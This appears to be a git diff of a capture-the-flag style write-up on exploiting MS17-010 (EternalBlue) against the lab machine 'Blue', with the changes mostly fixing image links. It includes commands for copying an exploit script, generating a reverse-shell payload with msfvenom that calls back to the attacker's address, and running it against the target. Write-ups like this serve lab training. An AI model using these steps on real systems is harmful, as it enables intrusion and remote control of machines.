@@ -85,13 +85,13 @@ Host script results:
 The NSE scripts show Blue is vulnerable to MS17-010, the same issue we exploited for Legacy. But this time, I didn't want to use a walkthrough of the box. Instead, I wanted to see how to manually exploit the issue *for the issue* and not just for the box.
 
 ## Searchsploit
-![Image of Searchsploit for MS17-010]
-(https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_searchsploit.png)
+![Image of Searchsploit for MS17-010](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_searchsploit.png)
 
 ## Exploit
 For this manual walkthrough, I followed Red Team Zone's "Eternal Blue" write-up (https://redteamzone.com/EternalBlue/). First, I mirrored **42315.py** down to my local machine and then made a working copy of it called **exploit.py**. 
 
 ```searschsploit -x 42315.py```
+
 ```cp 42315.py exploit.py```
 
 For this exploit to work, we need to download **mysmb.py** from https://github.com/worawit/MS17-010/blob/master/mysmb.py:
@@ -126,8 +126,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f exe > shel
 
 Great! Now we have the exploit and we have our shell. Now, how do we get them to play nice together such that the exploit will execute our shell and connext back to our attacking machine? For that, we need to modify the exploit Python code:
 
-![Exploit modification]
-(https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_exploit_mod.png)
+![Exploit modification](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_exploit_mod.png)
 
 Then set up a netcat listener on port 4444:
 
@@ -138,7 +137,6 @@ And run our exploit code (after we specify username='guest' in the exploit code.
 ```python exploit.py 10.10.10.40```
 
 ## Success!
-![Success!]
-(https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_success.png)
+![Success!](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_success.png)
 
 From here, as with Legacy, we are already system administrator, so we just navigate to both the user's Desktop and administrator's Desktop and retrieve the flags. Success!
